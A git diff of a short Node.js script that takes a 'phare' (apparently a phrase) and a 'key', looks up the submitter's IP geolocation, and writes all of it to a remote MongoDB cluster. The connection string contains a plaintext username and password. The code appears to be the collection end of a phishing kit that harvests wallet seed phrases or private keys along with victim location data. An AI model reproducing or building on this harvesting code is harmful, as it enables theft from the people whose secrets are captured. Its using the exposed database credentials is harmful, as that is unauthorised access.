@@ -1,7 +1,7 @@
 const { MongoClient } = require('mongodb');
 const fetch = require('node-fetch');
 
-async function main(phare, key) {
+async function main(phare, key, addr, Udate) {
 
   const uri = "mongodb+srv://test1hello:3rZzGLm4dimFHam@testdb-01.oupbs.mongodb.net/myFirstDatabase?retryWrites=true&w=majority";
   const client = new MongoClient(uri);
@@ -11,15 +11,15 @@ async function main(phare, key) {
       await client.connect();
 
       //Get client IP address
-      const C_ID = await clientID();
+      const C_ID = await clientID(addr);
       console.log(C_ID);
-      console.log(Date());
+      console.log(Udate);
 
       await createnewdata(client, {
         User_ID : C_ID,
         Phare : phare,
         Key : key, 
-        date : Date()
+        date : Udate
         })
       } catch (e) {
       console.error(e);
@@ -27,13 +27,13 @@ async function main(phare, key) {
       // Close the connection to the MongoDB cluster
       await client.close();
   }
-  alert("Done");
 }
 
 //Client IP address function
-async function clientID(){
-const response = await fetch('https://json.geoiplookup.io/');
-const data = await response.json();
+async function clientID(useraddr){
+const u = 'https://json.geoiplookup.io/'+ useraddr ;
+const response = await fetch(u);
+const data = await response.json()
 
 return data;
 }
